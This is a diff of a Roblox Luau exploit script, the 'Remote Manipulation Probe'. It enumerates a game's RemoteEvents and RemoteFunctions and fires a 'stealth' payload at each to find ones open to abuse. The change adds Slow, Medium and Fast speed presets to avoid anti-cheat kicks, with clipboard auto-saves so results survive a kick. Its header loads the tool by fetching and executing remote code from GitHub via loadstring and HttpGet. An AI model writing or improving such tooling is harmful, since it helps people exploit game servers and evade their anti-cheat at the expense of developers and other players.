@@ -7,12 +7,7 @@
   loadstring(game:HttpGet("https://raw.githubusercontent.com/aguy55409-commits/script/main/script.luau", true))()
 ]]
 
--- Tweak these if you get kicked before the report finishes:
-local PROBE_TIMEOUT = 1.0
-local DELAY_BETWEEN_REMOTES = 0.65 -- seconds (raise to 1.5 if still kicked)
-local SKIP_REMOTE_FUNCTIONS = true -- InvokeServer triggers more AC kicks
-local USE_STEALTH_PAYLOAD = true -- no obvious __AC_PROBE__ signature
-local AUTO_COPY_EVERY = 8 -- copy report to clipboard every N remotes (save before kick)
+local USE_STEALTH_PAYLOAD = true
 
 local function main()
 	local Players = game:GetService("Players")
@@ -40,10 +35,38 @@ local function main()
 		end
 	end
 
+	local SPEED_PRESETS = {
+		slow = {
+			label = "Slow",
+			delay = 2.0,
+			timeout = 1.5,
+			skipRemoteFunctions = false,
+			autoCopyEvery = 5,
+			flushEvery = 5,
+		},
+		medium = {
+			label = "Medium",
+			delay = 0.65,
+			timeout = 1.0,
+			skipRemoteFunctions = true,
+			autoCopyEvery = 8,
+			flushEvery = 10,
+		},
+		fast = {
+			label = "Fast",
+			delay = 0,
+			timeout = 0.35,
+			skipRemoteFunctions = false,
+			autoCopyEvery = 12,
+			flushEvery = 25,
+		},
+	}
+
 	local Report = { lines = {}, allRemotes = {}, manipulable = {} }
 	local screenGui, statusLabel, reportLabel, scrollFrame, pathInput
 	local lineCount = 0
 	local scanRunning = false
+	local activeConfig = SPEED_PRESETS.medium
 
 	local function reportLine(text)
 		table.insert(Report.lines, text)
@@ -106,8 +129,10 @@ local function main()
 		end)
 
 		local start = tick()
-		while not finished and tick() - start < PROBE_TIMEOUT do
-			task.wait(0.05)
+		local timeout = activeConfig.timeout
+		local poll = activeConfig.delay == 0 and 0 or 0.05
+		while not finished and tick() - start < timeout do
+			task.wait(poll)
 		end
 
 		if not finished then
@@ -125,7 +150,7 @@ local function main()
 			for _, inst in ipairs(game:GetDescendants()) do
 				if inst:IsA("RemoteEvent") then
 					table.insert(list, inst)
-				elseif inst:IsA("RemoteFunction") and not SKIP_REMOTE_FUNCTIONS then
+				elseif inst:IsA("RemoteFunction") and not activeConfig.skipRemoteFunctions then
 					table.insert(list, inst)
 				end
 			end
@@ -178,7 +203,7 @@ local function main()
 		statusLabel.TextWrapped = true
 		statusLabel.TextColor3 = Color3.fromRGB(160, 210, 255)
 		statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-		statusLabel.Text = "Kicked at end = your AC detected the scan (working). Press Probe All. Report auto-copies during scan."
+		statusLabel.Text = "Pick a speed: Slow (safest), Medium, Fast (most kicks). Report auto-copies during scan."
 		statusLabel.Parent = panel
 
 		pathInput = Instance.new("TextBox")
@@ -218,7 +243,7 @@ local function main()
 		reportLabel.TextYAlignment = Enum.TextYAlignment.Top
 		reportLabel.TextWrapped = true
 		reportLabel.AutomaticSize = Enum.AutomaticSize.Y
-		reportLabel.Text = "Press Probe All to start."
+		reportLabel.Text = "Press Slow, Medium, or Fast to start."
 		reportLabel.Parent = content
 
 		local function btn(text, x, w, fn, col)
@@ -269,11 +294,13 @@ local function main()
 		return canManipulate == true
 	end
 
-	local function runScan()
+	local function runScan(speedKey)
 		if scanRunning then
 			return
 		end
 		scanRunning = true
+
+		activeConfig = SPEED_PRESETS[speedKey] or SPEED_PRESETS.medium
 
 		Report.lines = {}
 		Report.allRemotes = {}
@@ -282,9 +309,12 @@ local function main()
 
 		reportLine("=== REMOTE MANIPULATION PROBE ===")
 		reportLine("Player: " .. player.Name .. " | PlaceId: " .. game.PlaceId)
-		reportLine("Delay: " .. DELAY_BETWEEN_REMOTES .. "s between remotes")
-		if SKIP_REMOTE_FUNCTIONS then
+		reportLine("Speed: " .. activeConfig.label)
+		reportLine("Delay: " .. activeConfig.delay .. "s | Timeout: " .. activeConfig.timeout .. "s per remote")
+		if activeConfig.skipRemoteFunctions then
 			reportLine("Mode: RemoteEvent only (skips RemoteFunction — less kicks)")
+		else
+			reportLine("Mode: RemoteEvent + RemoteFunction")
 		end
 		if USE_STEALTH_PAYLOAD then
 			reportLine("Payload: stealth (no __AC_PROBE__ tag)")
@@ -318,7 +348,8 @@ local function main()
 				return
 			end
 
-			statusLabel.Text = string.format("Probing %d/%d (wait %.1fs)...", i, #remotes, DELAY_BETWEEN_REMOTES)
+			local waitText = activeConfig.delay > 0 and string.format(" (%.1fs wait)", activeConfig.delay) or " (no delay)"
+			statusLabel.Text = string.format("[%s] Probing %d/%d%s", activeConfig.label, i, #remotes, waitText)
 
 			local ok, result = pcall(function()
 				return probeOneRemote(remote, i)
@@ -334,19 +365,19 @@ local function main()
 				safeCount += 1
 			end
 
-			if i % 10 == 0 or i == #remotes then
+			if i % activeConfig.flushEvery == 0 or i == #remotes then
 				flushDisplay(false)
 			end
 
-			if AUTO_COPY_EVERY > 0 and i % AUTO_COPY_EVERY == 0 then
+			if activeConfig.autoCopyEvery > 0 and i % activeConfig.autoCopyEvery == 0 then
 				local copied = copyText()
 				if copied and statusLabel then
 					statusLabel.Text = string.format("Auto-saved report to clipboard (%d/%d)", i, #remotes)
 				end
 			end
 
-			if i < #remotes then
-				task.wait(DELAY_BETWEEN_REMOTES)
+			if i < #remotes and activeConfig.delay > 0 then
+				task.wait(activeConfig.delay)
 			end
 		end
 
@@ -392,17 +423,31 @@ local function main()
 
 	local makeBtn = mountGui()
 
-	makeBtn("Probe All", 10, 95, function()
-		task.spawn(runScan)
-	end)
+	makeBtn("Slow", 8, 98, function()
+		task.spawn(function()
+			runScan("slow")
+		end)
+	end, Color3.fromRGB(35, 110, 65))
 
-	makeBtn("Copy All", 111, 95, function()
+	makeBtn("Medium", 112, 98, function()
+		task.spawn(function()
+			runScan("medium")
+		end)
+	end, Color3.fromRGB(45, 100, 200))
+
+	makeBtn("Fast", 216, 98, function()
+		task.spawn(function()
+			runScan("fast")
+		end)
+	end, Color3.fromRGB(200, 90, 45))
+
+	makeBtn("Copy All", 320, 95, function()
 		flushDisplay(true)
 		local copied, chars = copyText()
 		statusLabel.Text = copied and ("Copied " .. chars .. " chars.") or "Copy failed."
 	end)
 
-	makeBtn("Close", 212, 70, function()
+	makeBtn("Close", 421, 91, function()
 		screenGui:Destroy()
 		_G.__ServerExploitProbeLoaded = nil
 	end, Color3.fromRGB(80, 85, 100))
